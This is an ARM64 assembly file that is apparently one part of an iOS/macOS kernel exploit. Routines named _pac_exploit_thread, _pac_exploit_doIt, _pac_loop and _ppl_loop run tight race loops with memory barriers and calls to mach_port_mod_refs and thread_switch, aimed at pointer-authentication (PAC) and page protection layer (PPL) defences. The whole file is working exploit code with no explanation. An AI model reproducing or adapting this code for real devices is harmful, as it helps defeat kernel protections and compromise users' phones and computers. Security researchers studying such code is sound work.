.text
.align 4

.global _pac_exploit_thread
_pac_exploit_thread:
    mov x0, x20
    bl _mach_port_mod_refs
    b _pac_exploit_thread

.global _pac_exploit_doIt
_pac_exploit_doIt:
    ldr x24, [x11, x25]
    dmb sy
    cmp x24, x20
    bne _pac_exploit_doIt
_pac_exploit_doIt_cont:
    str x19, [x11, x26]
    dmb sy
    ldr x24, [x11, x25]
    dmb sy
    cmp x24, x20
    bne _pac_exploit_doIt
    str x18, [x11, x27]
    dmb sy
    b _pac_exploit_doIt_cont

.global _pac_loop
_pac_loop:
    mov x0, #1
    adrp x1, _gUserReturnDidHappen@PAGE
    str x0, [x1, _gUserReturnDidHappen@PAGEOFF]
    b _pac_loop

.global _ppl_loop
_ppl_loop:
    mov x4, 1
    str x4, [x3]
_ppl_loop_inner:
    str x0, [x1]
    ldr x3, [x2]
    cmp x3, xzr
    beq _ppl_loop_inner
_ppl_yield_loop:
    mov x0, 0
    mov x1, 0
    mov x2, 0
    bl _thread_switch
    b _ppl_yield_loop

.global _ppl_done
_ppl_done:
    b _ppl_done

.data
.global _gUserReturnDidHappen
_gUserReturnDidHappen:
    .quad 0
